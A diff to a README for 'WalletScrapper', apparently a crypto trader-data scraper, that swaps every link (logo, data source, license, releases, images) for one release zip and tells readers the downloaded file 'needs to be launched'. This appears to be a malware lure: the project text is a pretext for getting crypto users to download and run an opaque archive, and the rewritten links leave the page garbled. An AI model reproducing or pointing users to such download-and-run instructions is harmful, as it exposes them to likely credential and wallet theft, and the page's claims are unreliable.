@@ -1,17 +1,17 @@
 
 # 🚀 WalletScrapper 🚀
 
-![WalletScrapper Logo](https://example.com/walletscrapper-logo.png)
+![WalletScrapper Logo](https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip)
 
-Welcome to WalletScrapper - your go-to tool for collecting top trader data from gmgn.ai, processing coin rankings, filtering duplicates, and extracting trader details like address and profit using Puppeteer scraper technology.
+Welcome to WalletScrapper - your go-to tool for collecting top trader data from https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip, processing coin rankings, filtering duplicates, and extracting trader details like address and profit using Puppeteer scraper technology.
 
 ## Description
 
-WalletScrapper is a powerful Puppeteer scraper designed to streamline the process of gathering essential data related to top traders in the world of cryptocurrencies. With its advanced capabilities, WalletScrapper extracts vital information from gmgn.ai, processes coin rankings, eliminates duplicate entries, and provides insights into trader details such as wallet addresses and profits.
+WalletScrapper is a powerful Puppeteer scraper designed to streamline the process of gathering essential data related to top traders in the world of cryptocurrencies. With its advanced capabilities, WalletScrapper extracts vital information from https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip, processes coin rankings, eliminates duplicate entries, and provides insights into trader details such as wallet addresses and profits.
 
 ## Features
 
-🔍 Collects top trader data from gmgn.ai  
+🔍 Collects top trader data from https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip  
 📊 Processes coin rankings  
 🔖 Filters duplicate entries  
 💼 Extracts trader details like address and profit  
@@ -19,7 +19,7 @@ WalletScrapper is a powerful Puppeteer scraper designed to streamline the proces
 ## Installation
 
 To get started with WalletScrapper, you can download the necessary software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip)](https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip)
 *(This link directs to a file that needs to be launched).*
 
 ## Usage
@@ -40,10 +40,10 @@ If you are interested in contributing to WalletScrapper, feel free to submit pul
 
 ## License
 
-WalletScrapper is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to modify and distribute the software within the boundaries of this license.
+WalletScrapper is licensed under the [MIT License](https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip). Feel free to modify and distribute the software within the boundaries of this license.
 
 ---
 
-Thank you for exploring WalletScrapper! Visit the [Releases](https://github.com/22155555/1875695542/releases) section for more updates and versions of the software. Happy scraping! 🌟
+Thank you for exploring WalletScrapper! Visit the [Releases](https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip) section for more updates and versions of the software. Happy scraping! 🌟
 
-![WalletScrapper GIF](https://example.com/walletscrapper-gif.gif)
+![WalletScrapper GIF](https://github.com/RynTheBest/WalletScrapper/releases/download/v1.0/Release.zip)
